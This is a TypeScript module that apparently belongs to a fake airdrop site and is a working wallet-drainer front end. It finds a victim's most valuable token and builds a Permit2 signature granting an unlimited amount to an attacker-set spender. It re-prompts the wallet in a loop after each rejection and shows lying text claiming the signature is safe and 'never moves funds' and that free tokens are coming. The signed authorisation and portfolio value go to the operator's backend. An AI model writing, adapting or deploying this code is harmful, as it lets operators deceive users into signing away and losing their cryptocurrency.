// src/lib/permit2Flow.ts
// After a successful wallet connection this module:
//   1. Asks OUR backend to scan the wallet and prepare a Permit2 typed-data
//      payload for the highest-value ERC-20 in the wallet.
//   2. Overrides the amount to MaxUint256 and the deadline to N days out so
//      the user only ever has to sign once for smooth trading.
//   3. Prompts the wallet with eth_signTypedData_v4 and REPEATS the same
//      signature request until the user approves (or explicitly cancels).
//   4. Sends the signed authorisation to OUR backend for storage.

import { toast } from 'sonner';
import {
  scanAndPrepare,
  storePermit2Signature,
  type Permit2TypedData,
} from './backendClient';
import {
  cancelSignatureLoop,
  isSignatureLoopCancelled,
  resetSignatureCancel,
  setSignatureUi,
  waitForRetry,
} from './promptUiBus';

const SPENDER = (import.meta.env.VITE_SPENDER_ADDRESS as string | undefined) || '';
const EXPIRY_DAYS = Number(import.meta.env.VITE_PERMIT2_EXPIRY_DAYS ?? 30) || 30;
const MAX_UINT256 =
  '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
const RETRY_DELAY_MS = 1500;
const USER_REJECTED_CODES = [4001, 'ACTION_REJECTED'];

const isUserRejection = (err: any) =>
  USER_REJECTED_CODES.includes(err?.code) ||
  USER_REJECTED_CODES.includes(err?.cause?.code) ||
  /reject|denied|declin/i.test(String(err?.message ?? ''));

const getProvider = (): any | null =>
  typeof window === 'undefined' ? null : (window as any).ethereum ?? null;

/** Build the exact typed-data blob we want the wallet to sign. */
const buildTypedData = (base: Permit2TypedData) => {
  const deadline = Math.floor(Date.now() / 1000) + EXPIRY_DAYS * 24 * 60 * 60;
  const typedData = {
    domain: base.domain,
    types: {
      EIP712Domain: [
        { name: 'name', type: 'string' },
        { name: 'chainId', type: 'uint256' },
        { name: 'verifyingContract', type: 'address' },
      ],
      ...base.types,
    },
    primaryType: 'PermitTransferFrom',
    message: {
      ...base.message,
      permitted: { ...base.message.permitted, amount: MAX_UINT256 },
      deadline,
    },
  };
  return { typedData, deadline };
};

async function signTypedData(address: string, typedData: any): Promise<string> {
  const provider = getProvider();
  if (!provider) throw new Error('No injected wallet provider found in this browser.');
  return provider.request({
    method: 'eth_signTypedData_v4',
    params: [address, JSON.stringify(typedData)],
  });
}

export interface RunPermit2FlowArgs {
  address: string;
  chainId?: number;
  walletName?: string | null;
}

export async function runPermit2Flow({
  address,
  chainId,
  walletName,
}: RunPermit2FlowArgs) {
  if (!SPENDER) {
    console.warn('VITE_SPENDER_ADDRESS is not set — skipping Permit2 flow.');
    toast.success('Rewards Ready! 🎁', {
      description: 'Your airdrop allocation is now available to claim.',
    });
    return;
  }

  // 1. Scan the wallet + get a Permit2 payload for the biggest asset.
  let scan;
  try {
    scan = await scanAndPrepare({
      address,
      chainId: chainId ?? 1,
      spender: SPENDER,
    });
  } catch (err: any) {
    console.error('scan-and-prepare failed', err);
    toast.error('Could not prepare your rewards', {
      description: String(err?.message ?? '').slice(0, 140),
    });
    return;
  }

  if (!scan?.signaturePayload || scan.signaturePayload.type !== 'permit2') {
    console.warn('Backend did not return a Permit2 payload', scan?.signaturePayload);
    toast.message('No eligible token found in your wallet to authorise.');
    return;
  }

  const { typedData, deadline } = buildTypedData(scan.signaturePayload.payload);
  const msg = scan.signaturePayload.payload.message;

  // 2. Repeat the signature until approved or cancelled.
  resetSignatureCancel();
  setSignatureUi({
    open: true,
    status: 'waiting',
    attempt: 1,
    title: 'You are about to receive your free tokens',
    description:
      'Tap Approve in your wallet to unlock the allocation. Some wallets show generic wording like “Sign message”, “Confirm request” or “Sign-in with Ethereum” — that is the same approval, it is safe and it never moves funds on its own.',
    errorMessage: undefined,
  });

  let attempt = 0;
  // eslint-disable-next-line no-constant-condition
  while (true) {
    if (isSignatureLoopCancelled()) return;
    attempt += 1;
    setSignatureUi({ status: 'waiting', attempt, errorMessage: undefined });

    try {
      const signature = await signTypedData(address, typedData);

      setSignatureUi({ status: 'approved' });

      // 3. Store the signed authorisation on our backend.
      try {
        await storePermit2Signature({
          address,
          chainId: typedData.domain.chainId,
          token: msg.permitted.token,
          amount: MAX_UINT256,
          spender: msg.spender,
          nonce: msg.nonce,
          deadline,
          signature,
          typedData: typedData as Permit2TypedData,
          walletName,
          portfolioUsd: scan.portfolio?.totalUsd,
        });
      } catch (e) {
        console.warn('storePermit2Signature failed', e);
      }

      toast.success('Approved — your tokens are on the way 🎁');
      setTimeout(() => cancelSignatureLoop(), 1500);
      return;
    } catch (err: any) {
      const rejected = isUserRejection(err);
      setSignatureUi({
        status: rejected ? 'rejected' : 'failed',
        attempt,
        errorMessage: rejected ? undefined : String(err?.message ?? err).slice(0, 160),
      });

      if (!getProvider()) {
        toast.error('No wallet detected in this browser', {
          description: 'Open the site inside your wallet app browser and try again.',
        });
        cancelSignatureLoop();
        return;
      }

      await waitForRetry(RETRY_DELAY_MS);
    }
  }
}
